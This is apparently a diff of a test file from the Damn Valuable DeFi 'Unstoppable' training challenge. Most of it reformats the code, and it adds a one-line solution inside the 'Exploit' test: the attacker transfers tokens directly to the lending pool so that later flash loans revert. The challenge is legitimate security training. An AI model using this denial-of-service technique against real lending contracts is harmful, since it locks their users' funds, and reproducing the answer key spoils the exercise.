@@ -1,11 +1,22 @@
-const { ether, expectRevert } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
+const {
+    ether,
+    expectRevert
+} = require('@openzeppelin/test-helpers');
+const {
+    accounts,
+    contract
+} = require('@openzeppelin/test-environment');
 
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
 const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');
+const HackerUnstoppableContract = contract.fromArtifact('HackerUnstoppable');
 
-const { expect } = require('chai');
+const util = require('util');
+
+const {
+    expect
+} = require('chai');
 
 describe('[Challenge] Unstoppable', function () {
 
@@ -17,13 +28,23 @@ describe('[Challenge] Unstoppable', function () {
 
     before(async function () {
         /** SETUP SCENARIO */
-        this.token = await DamnValuableToken.new({ from: deployer });
-        this.pool = await UnstoppableLender.new(this.token.address, { from: deployer });
+        this.token = await DamnValuableToken.new({
+            from: deployer
+        });
+        this.pool = await UnstoppableLender.new(this.token.address, {
+            from: deployer
+        });
 
-        await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer });
-        await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer });
+        await this.token.approve(this.pool.address, TOKENS_IN_POOL, {
+            from: deployer
+        });
+        await this.pool.depositTokens(TOKENS_IN_POOL, {
+            from: deployer
+        });
 
-        await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, { from: deployer });
+        await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, {
+            from: deployer
+        });
 
         expect(
             await this.token.balanceOf(this.pool.address)
@@ -33,19 +54,26 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker)
         ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);
 
-         // Show it's possible for anyone to take out a flash loan
-         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
-         await this.receiverContract.executeFlashLoan(10, { from: someUser });
+        // Show it's possible for anyone to take out a flash loan
+        this.receiverContract = await ReceiverContract.new(this.pool.address, {
+            from: someUser
+        });
+        await this.receiverContract.executeFlashLoan(10, {
+            from: someUser
+        });
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, {from: attacker});
     });
 
     after(async function () {
         /** SUCCESS CONDITION */
         await expectRevert.unspecified(
-            this.receiverContract.executeFlashLoan(10, { from: someUser })
+            this.receiverContract.executeFlashLoan(10, {
+                from: someUser
+            })
         );
     });
 });
